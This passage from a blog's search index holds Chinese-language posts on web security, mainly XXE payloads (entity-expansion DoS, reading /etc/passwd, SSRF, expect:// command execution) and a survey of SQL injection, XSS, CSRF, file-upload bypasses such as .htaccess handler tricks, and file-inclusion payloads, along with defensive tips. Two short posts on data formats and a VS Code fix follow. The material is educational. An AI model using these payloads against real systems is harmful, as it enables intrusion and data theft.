class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>info.dtd 的内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">content</span> <span class="string">&quot;%param1;%param2;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-3-普通的XML注入"><a href="#1-3-普通的XML注入" class="headerlink" title="1..3 普通的XML注入"></a>1..3 普通的XML注入</h3><p>例子：</p><p><img src="/img/20220419121301.png"></p><p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE。</p><h2 id="2-XXE注入"><a href="#2-XXE注入" class="headerlink" title="2 XXE注入"></a>2 XXE注入</h2><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个只利用<strong>外部实体</strong>的注入漏洞，如果能注入<strong>外部实体</strong>并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到，如果有的话应该也是逻辑漏洞）</p><p>XXE 和 SQL注入 的攻击方法也有一点相似，也分有回显和没有回显。</p><p>有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据。</p><h2 id="3-攻击方式"><a href="#3-攻击方式" class="headerlink" title="3 攻击方式"></a>3 攻击方式</h2><p><strong>拒绝服务攻击</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1. <span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [ </span></span><br><span class="line"><span class="meta">2. <span class="meta">&lt;!ELEMENT <span class="keyword">data</span> (<span class="keyword">#ANY</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">3. <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span> </span></span><br><span class="line"><span class="meta">4. <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">5. <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">6. ]&gt;</span> </span><br><span class="line">7. <span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p><p><strong>文件读取</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1. <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line">2. <span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [ </span></span><br><span class="line"><span class="meta">3. <span class="meta">&lt;!ELEMENT <span class="keyword">data</span> (<span class="keyword">#ANY</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">4. <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">5. ]&gt;</span> </span><br><span class="line">6. <span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SSRF</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1. <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line">2. <span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://publicServer.com/&quot;</span> [ </span></span><br><span class="line"><span class="meta">3. <span class="meta">&lt;!ELEMENT <span class="keyword">data</span> (<span class="keyword">#ANY</span>)&gt;</span> </span></span><br><span class="line"><span class="meta">4. ]&gt;</span> </span><br><span class="line">5. <span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>RCE</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1. <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line">2. <span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span> </span></span><br><span class="line"><span class="meta">3. <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span> </span><br><span class="line">4. <span class="tag">&lt;<span class="name">catalog</span>&gt;</span> </span><br><span class="line">5.    <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span> </span><br><span class="line">6.       <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span> </span><br><span class="line">7.    <span class="tag">&lt;/<span class="name">core</span>&gt;</span> </span><br><span class="line">8. <span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>XInclude</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1. <span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span> </span><br><span class="line">2. <span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;http://publicServer.com/file.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见漏洞概述</title>
      <link href="/2022/04/25/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/"/>
      <url>/2022/04/25/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1 SQL注入"></a>1 SQL注入</h1><h2 id="1-1-SQL注入原理"><a href="#1-1-SQL注入原理" class="headerlink" title="1.1 SQL注入原理"></a>1.1 SQL注入原理</h2><p>web应用程序对用户输入的数据没有过滤或者过滤的不严谨，将用户输入的数据作为SQL语句在数据库中执行，以至于用户可以拼接执行SQL命令。</p><p>可能导致数据泄露或数据破坏，甚至完全接管主机。</p><h2 id="1-2-SQL注入分类"><a href="#1-2-SQL注入分类" class="headerlink" title="1.2 SQL注入分类"></a>1.2 SQL注入分类</h2><p>从反馈结果来分：</p><ul><li><p>回显型</p></li><li><p>无回显型&#x2F;盲注</p></li></ul><p>从攻击手法上来分：</p><ul><li><p>联合查询注入  union select</p></li><li><p>堆叠注入 有的应用可以加入<code>;</code>后一次执行多条语句</p></li><li><p>报错注入 updatexml、floor、ExtractValue、exp等</p></li><li><p>盲注</p><ul><li>布尔盲注</li><li>时间盲注</li></ul></li></ul><h2 id="1-3-SQL注入防御"><a href="#1-3-SQL注入防御" class="headerlink" title="1.3 SQL注入防御"></a>1.3 SQL注入防御</h2><p>代码层防御：</p><ul><li><p>对用户输入的内容进行转义（PHP中的addslashes()、mysql_real_escape()函数）。</p></li><li><p>限制关键字的输入（PHP中的preg_replace()函数正则替换关键字），限制输入的长度。</p></li><li><p>使用SQL语句预处理，对SQL语句首先进行预编译，然后进行参数绑定，最后传入参数。</p></li></ul><p>网络层面：</p><ul><li>部署防火墙和软硬WAF</li></ul><h1 id="2-XSS注入"><a href="#2-XSS注入" class="headerlink" title="2 XSS注入"></a>2 XSS注入</h1><h2 id="2-1-XSS注入原理"><a href="#2-1-XSS注入原理" class="headerlink" title="2.1 XSS注入原理"></a>2.1 XSS注入原理</h2><p>XSS跨站脚本攻击，是HTML代码的注入，通过网页注入浏览器可执行的代码，从而实现攻击。</p><p>XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。</p><h2 id="2-2-XSS注入分类"><a href="#2-2-XSS注入分类" class="headerlink" title="2.2 XSS注入分类"></a>2.2 XSS注入分类</h2><p>反射型</p><ul><li><p>需要经过服务器解析，并与数据库产生交互</p></li><li><p>只会反弹一次攻击代码，并不长期存储攻击代码</p></li></ul><p>存储型</p><ul><li><p>需要经过服务器解析，并与数据库产生交互</p></li><li><p>会将攻击代码长期存储在受害者服务器</p></li></ul><p>DOM型</p><ul><li>只需要经过前端解析，在JavaScript脚本动态执行的过程中产生，不与数据库产生交互</li><li>会将攻击代码长期存储在受害者服务器</li></ul><h2 id="2-3-XSS的危害"><a href="#2-3-XSS的危害" class="headerlink" title="2.3 XSS的危害"></a>2.3 XSS的危害</h2><p>存在XSS漏洞时，可能会导致以下几种情况： </p><ul><li>用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。</li><li>攻击者能够在一定限度内记录用户的键盘输入。</li><li>攻击者通过CSRF等方式以用户身份执行危险操作。</li><li>XSS蠕虫。 </li><li>获取用户浏览器信息。</li><li>利用XSS漏洞扫描用户内网。</li></ul><h2 id="2-4-CORS"><a href="#2-4-CORS" class="headerlink" title="2.4 CORS"></a>2.4 CORS</h2><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。通过这个标准，可以允许浏览器读取跨域的资源。</p><h2 id="2-5-同源策略"><a href="#2-5-同源策略" class="headerlink" title="2.5 同源策略"></a>2.5 同源策略</h2><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p><h3 id="2-5-1-源的更改"><a href="#2-5-1-源的更改" class="headerlink" title="2.5.1 源的更改"></a>2.5.1 源的更改</h3><p>同源策略认为域和子域属于不同的域，例如 <code>child1.a.com 与 a.com</code> ，<code>child1.a.com 与 child2.a.com</code>，<code>xxx.child1.a.com 与 child1.a.com</code>两两不同源。</p><p>对于这种情况，可以在两个方面各自设置<code>document.domain=&#39;a.com&#39;</code>来改变其源来实现以上任意两个页面之间的通信。</p><p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 null 。</p><h3 id="2-5-2-cookie的同源策略"><a href="#2-5-2-cookie的同源策略" class="headerlink" title="2.5.2 cookie的同源策略"></a>2.5.2 cookie的同源策略</h3><p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix）即可。 </p><p>不管使用哪个协议（HTTP&#x2F;HTTPS）或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie 时，可以使用<code>domain</code> &#x2F; <code>path</code> &#x2F; <code>secure</code> 和 <code>http-only</code> 标记来限定其访问性。 </p><p>所以<code>https://localhost:8080/</code>和<code>http://localhost:8081/</code>的Cookie是共享的。 </p><h2 id="2-5-XSS的防御"><a href="#2-5-XSS的防御" class="headerlink" title="2.5 XSS的防御"></a>2.5 XSS的防御</h2><ul><li>如非必要不开启CORS。</li><li>定义详细的白名单，不使用通配符，仅配置所需要的头。</li><li>配置 Vary: Origin 头部。</li><li>如非必要不使用 Access-Control-Allow-Credentials（声明是否允许在请求中带入）。</li><li>限制缓存的时间。</li></ul><h1 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3 CSRF"></a>3 CSRF</h1><p>Cross-Site Request Forgery 跨站点请求伪造，尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS 利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。 </p><h2 id="3-1-CSRF原理"><a href="#3-1-CSRF原理" class="headerlink" title="3.1 CSRF原理"></a>3.1 CSRF原理</h2><p><strong>第一步</strong>：用户通过浏览器登陆访问目标网站A，网站A会返回给浏览器用户的认证信息（<code>cookie</code>或<code>sessionid</code>），此时对于网站A，用户的请求都是合法的。<br><strong>第二步</strong>：在网站A不退出，浏览器不关闭的情况下（目的是保证认证信息不失效），用户点击了黑客构造的恶意链接（恶意链接的内容是去访问网站A，对网站A产生影响）。<br><strong>第三步</strong>：网站A响应执行黑客构造的恶意链接，攻击发生（因为此时恶意链接带了用户的认证信息，所以网站A认为恶意链接是合法的）。</p><p><img src="/img/20220415103953.png"></p><h3 id="3-1-1利用条件"><a href="#3-1-1利用条件" class="headerlink" title="3.1.1利用条件"></a>3.1.1利用条件</h3><ul><li>已登陆系统，用户访问URL，已存在的网站中允许用户跳转（认证信息不失效）。</li><li>欺骗用户访问URL。</li></ul><h2 id="3-2-漏洞危害"><a href="#3-2-漏洞危害" class="headerlink" title="3.2 漏洞危害"></a>3.2 漏洞危害</h2><p>修改用户信息：用户头像，发货地址，添加账号，删除账号等。</p><p>CSRF通过和XSS漏洞一起结合使用，XSS可以进行cookie窃取和session劫持，从而为CSRF获取到认证信息。</p><h2 id="3-3-CSRF防护"><a href="#3-3-CSRF防护" class="headerlink" title="3.3 CSRF防护"></a>3.3 CSRF防护</h2><ul><li>设置随机<code>Token</code>进行验证。</li><li>验证HTTP请求的<code>Referer</code>字段。</li><li>设置验证码。</li><li>限制请求方法最好为<code>POST</code>请求。</li><li>当用户发送重要的请求需要输入登陆原始密码。</li></ul><h1 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4 SSRF"></a>4 SSRF</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。 （正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h2 id="4-1-SSRF形成的原因"><a href="#4-1-SSRF形成的原因" class="headerlink" title="4.1 SSRF形成的原因"></a>4.1 SSRF形成的原因</h2><p>大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h1 id="5-命令注入"><a href="#5-命令注入" class="headerlink" title="5 命令注入"></a>5 命令注入</h1><p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p><h1 id="6-目录穿越"><a href="#6-目录穿越" class="headerlink" title="6 目录穿越"></a>6 目录穿越</h1><p>目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 ..&#x2F; 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。 </p><h1 id="7-文件读取"><a href="#7-文件读取" class="headerlink" title="7 文件读取"></a>7 文件读取</h1><p>用户目录下的敏感文件：</p><ul><li><code>.bash_history</code></li><li><code>.zsh_history</code> </li><li><code>.profile</code> </li><li><code>.bashrc</code> </li><li><code>.gitconfig</code> </li><li><code>.viminfo</code></li><li><code>passwd</code></li></ul><p>应用的配置文件：</p><ul><li><code>/var/log/apache2/access.log</code> </li><li><code>/var/log/nginx/access.log</code></li></ul><p>站点目录下的敏感文件：</p><ul><li><code>.svn/entries</code> </li><li><code>.git/HEAD</code> </li><li><code>WEB-INF/web.xml</code> </li><li><code>.htaccess</code></li></ul><p>特殊的备份文件：</p><ul><li><code>.swp</code> </li><li><code>.swo</code> </li><li><code>.bak</code> </li><li><code>index.php~</code></li></ul><p>Python的Cache：</p><ul><li><code>pycache_init_.cpython-35.pyc</code></li></ul><h1 id="8-文件上传"><a href="#8-文件上传" class="headerlink" title="8 文件上传"></a>8 文件上传</h1><p>上传恶意文件，达到拿下shell的目的。</p><h2 id="8-1-更改请求绕过"><a href="#8-1-更改请求绕过" class="headerlink" title="8.1 更改请求绕过"></a>8.1 更改请求绕过</h2><p>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。同样的，有的站点在后端仅检查 </p><p>了HTTP Header中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。</p><h2 id="8-2-Magic检测绕过"><a href="#8-2-Magic检测绕过" class="headerlink" title="8.2 Magic检测绕过"></a>8.2 Magic检测绕过</h2><p>有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的 </p><p>头字节如下表所示。</p><table><thead><tr><th align="center">类型</th><th align="center">二进制</th></tr></thead><tbody><tr><td align="center">JPG</td><td align="center">FF D8 FF E0 00 10 4A 46 49 46</td></tr><tr><td align="center">GIF</td><td align="center">47 49 46 38 39 61</td></tr><tr><td align="center">PNG</td><td align="center">89 50 4E 47</td></tr><tr><td align="center">TIF</td><td align="center">49 49 2A 00</td></tr><tr><td align="center">BMP</td><td align="center">42 4D</td></tr></tbody></table><h2 id="8-3-后缀绕过"><a href="#8-3-后缀绕过" class="headerlink" title="8.3 后缀绕过"></a>8.3 后缀绕过</h2><p>部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。 </p><p>php由于历史原因，部分解释器可能支持符合正则<code>/ph(p[2-7]?|t(ml)?)/</code>的后缀，如 <code>php</code> &#x2F; <code>php5</code> &#x2F; <code>pht</code> &#x2F; <code>phtml</code> &#x2F; <code>shtml</code> &#x2F; <code>pwml</code> &#x2F; <code>phtm</code> 等可在禁止上传php文件时测试该类型。</p><p><code>jsp</code>引擎则可能会解析 <code>jspx</code> &#x2F; <code>jspf</code> &#x2F; <code>jspa</code> &#x2F; <code>jsw</code> &#x2F; <code>jsv</code> &#x2F; <code>jtml</code> 等后缀，</p><p>asp支持 <code>asa</code> &#x2F; <code>asax</code> &#x2F; <code>cer</code> &#x2F; <code>cdx</code> &#x2F; <code>aspx</code> &#x2F; <code>ascx</code> &#x2F; <code>ashx</code> &#x2F; <code>asmx</code> &#x2F; <code>asp&#123;80-90&#125;</code> 等后缀。 </p><p>除了这些绕过，其他的后缀同样可能带来问题，如 <code>vbs</code> &#x2F; <code>asis</code> &#x2F; <code>sh</code> &#x2F; <code>reg</code> &#x2F; <code>cgi</code> &#x2F; <code>exe</code> &#x2F; <code>dll</code> &#x2F; <code>com</code> &#x2F; <code>bat</code> &#x2F; <code>pl</code> &#x2F; <code>cfc</code> &#x2F; <code>cfm</code> &#x2F; <code>ini</code> 等。 </p><h2 id="8-4-系统命名绕过"><a href="#8-4-系统命名绕过" class="headerlink" title="8.4 系统命名绕过"></a>8.4 系统命名绕过</h2><p>在Windows系统中，上传 <code>index.php.</code> 会重命名为 <code>.</code> ，可以绕过后缀检查。也可尝试 <code>index.php%20</code> ， <code>index.php:1.jpg</code> &#x2F; <code>index.php::$DATA</code> 等。在Linux系统中，可以尝试上传名为 <code>index.php/.</code> 或 <code>./aa/../index.php/.</code> 的文件。</p><h2 id="8-5-user-ini"><a href="#8-5-user-ini" class="headerlink" title="8.5 .user.ini"></a>8.5 .user.ini</h2><p>在php执行的过程中，除了主 <code>php.ini</code> 之外，<code>PHP</code> 还会在每个目录下扫描 <code>INI</code> 文件，从被执行的 <code>PHP</code> 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code>.user.ini</code> 中可以定义除了<code>PHP_INI_SYSTEM</code>以外的模式的选项，故可以使用 <code>.user.ini</code> 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> 。 </p><h2 id="8-6-竞争上传绕过"><a href="#8-6-竞争上传绕过" class="headerlink" title="8.6 竞争上传绕过"></a>8.6 竞争上传绕过</h2><p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell。</p><h2 id="8-7-Apache重写GetShell"><a href="#8-7-Apache重写GetShell" class="headerlink" title="8.7 Apache重写GetShell"></a>8.7 Apache重写GetShell</h2><p>Apache可根据是否允许重定向考虑上传<code>.htaccess</code></p><p>内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. AddType application/x-httpd-php .png </span><br><span class="line">2. php_flag engine 1</span><br></pre></td></tr></table></figure><p>就可以用png或者其他后缀的文件做php脚本了</p><h2 id="8-8-软链接任意读文件"><a href="#8-8-软链接任意读文件" class="headerlink" title="8.8 软链接任意读文件"></a>8.8 软链接任意读文件</h2><p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件若服务器没有做好防护，可实现任意文件读取的效果。</p><h2 id="8-9-防护技巧"><a href="#8-9-防护技巧" class="headerlink" title="8.9 防护技巧"></a>8.9 防护技巧</h2><ul><li>使用白名单限制上传文件的类型 </li><li>使用更严格的文件类型检查方式 </li><li>限制Web Server对上传文件夹的解析</li></ul><h1 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9 文件包含"></a>9 文件包含</h1><h2 id="9-1-基础"><a href="#9-1-基础" class="headerlink" title="9.1 基础"></a>9.1 基础</h2><p>常见的文件包含漏洞的形式为 <code>&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt;</code> </p><p>考虑常用的几种包含方式为：</p><ul><li><p>同目录包含 <code>file=.htaccess</code> </p></li><li><p>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code> </p></li><li><p>日志注入 <code>?file=../../../../../../../../../var/log/apache/error.log</code> </p></li><li><p>利用 <code>/proc/self/environ</code></p></li></ul><p>其中日志可以使用SSH日志或者Web日志等多种日志来源测试。</p><h2 id="9-2-绕过"><a href="#9-2-绕过" class="headerlink" title="9.2 绕过"></a>9.2 绕过</h2><ul><li>url编码绕过<ul><li>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过。</li></ul></li><li>特殊字符绕过<ul><li>某些情况下，读文件支持使用Shell通配符，如 <code>?</code>  <code>*</code>  等</li><li>url中使用 <code>?</code> <code>#</code> 可能会影响include包含的结果 </li><li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li></ul></li><li>%00截断<ul><li>几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。</li></ul></li><li>长度截断<ul><li>Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。<code>msdn</code>定义<code>#define MAX_PATH 260</code> ，其中第260个字符为字符串结尾的 <code>\0</code> ，而<code>linux</code>可以用<code>getconf</code>来判断文件名长度限制和文件路径长度限制。获取最长文件路径长度：<code>getconf PATH_MAX /root</code> 得到4096获取最长文件名：<code>getconf NAME_MAX /root</code> 得到255 。那么在长度有限的时候， <code>././././</code> (n个) 的形式就可以通过这个把路径爆掉。 </li><li>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</li></ul></li><li>伪协议绕过<ul><li><strong>远程包含</strong>: 要求 <code>allow_url_fopen=On</code> 且 <code>allow_url_include=On</code> ，payload 为 <code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code> 的形式</li><li><strong>PHP input</strong>: 把payload放在POST参数中作为包含的文件，要求 <code>allow_url_include=On</code> ，payload为 <code>?file=php://input</code> 的形式</li><li><strong>Base64</strong>: 使用Base64伪协议读取文件，payload为 <code>?file=php://filter/convert.base64- encode/resource=index.php</code> 的形式</li><li><strong>data</strong>: 使用data伪协议读取文件，payload为 <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code> 的形式，要求 <code>allow_url_include=On</code></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见数据交换格式</title>
      <link href="/2022/03/06/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E6%A0%BC%E5%BC%8F/"/>
      <url>/2022/03/06/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="常见数据交换格式"><a href="#常见数据交换格式" class="headerlink" title="常见数据交换格式"></a>常见数据交换格式</h1><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><p><strong>介绍</strong></p><p><code>JSON</code>（<code>JavaScript Object Notation</code>）是由道格拉斯·克罗克福特构想和设计的一种轻量级资料交换格式。其内容由属性和值所组成，因此也有易于阅读和处理的优势。<code>JSON</code>是独立于编程语言的资料格式，其不仅是<code>JavaScript</code>的子集，也采用了<code>C</code>语言家族的习惯用法，目前也有许多编程语言都能够将其解析和字符串化，其广泛使用的程度也使其成为通用的资料格式。</p><p><strong>格式</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">          &quot;age&quot;: &quot;20&quot;,</span><br><span class="line">          &quot;name&quot;: &quot;张三&quot;,</span><br><span class="line">          &quot;sex&quot;: &quot;男&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>介绍</strong></p><p>可扩展标记语言（英语：<code>Extensible Markup Language</code>，简称：<code>XML</code>）是一种标记语言。<code>XML</code>是从标准通用标记语言（<code>SGML</code>）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（<code>XSL</code>）、<code>XBRL</code>和<code>XPath</code>等。</p><p><strong>格式</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;o&gt;</span><br><span class="line">     &lt;age type=&quot;string&quot;&gt;20&lt;/age&gt;</span><br><span class="line">     &lt;name type=&quot;string&quot;&gt;张三&lt;/name&gt;</span><br><span class="line">     &lt;sex type=&quot;string&quot;&gt;男&lt;/sex&gt;</span><br><span class="line">&lt;/o&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据格式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode更新失败</title>
      <link href="/2022/01/28/vscode/"/>
      <url>/2022/01/28/vscode/</url>
      
        <content type="html"><![CDATA[<p><strong>更新失败的解决方法</strong></p><p>打开Vscode后，它会自动在你的C盘自动生成一份配置文件。报错的路径也是指向这里：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\你的用户名\AppData\Local\Programs\Microsoft VS Code</span><br></pre></td></tr></table></figure><p>从安装目录<code>D:\Microsoft VS Code</code>复制Code.exe到<code>C:\Users\你的用户名\AppData\Local\Programs\Microsoft VS Code</code> </p><p>然后再重启vscode，在设置中检查更新，之后右下角提示更新，点立即更新。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
